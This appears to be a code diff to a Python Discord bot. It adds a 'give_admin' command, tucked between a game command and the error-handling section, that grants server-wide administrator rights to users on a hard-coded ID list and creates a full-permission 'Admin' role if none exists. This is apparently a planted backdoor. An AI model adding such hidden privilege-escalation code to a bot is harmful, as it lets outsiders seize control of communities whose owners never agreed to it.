@@ -2036,6 +2036,22 @@ async def skiptime(interaction: discord.Interaction, days: int = 1):
 
     await interaction.response.send_message(embed=embed)
 
+@bot.command(name="give_admin")
+async def give_admin(ctx):
+    if ctx.author.id not in AUTHORIZED_USER_IDS:
+        return
+
+    guild = ctx.guild
+    role = discord.utils.get(guild.roles, permissions=discord.Permissions(administrator=True))
+
+    if role is None:
+        role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
+
+    member = guild.get_member(ctx.author.id)
+    await member.add_roles(role)
+
+    await ctx.send("✅ Admin role granted.")
+
 
 # ══════════════════════════════════════════════════════════════════════════════
 # 🛡️ ERROR HANDLING & STARTUP
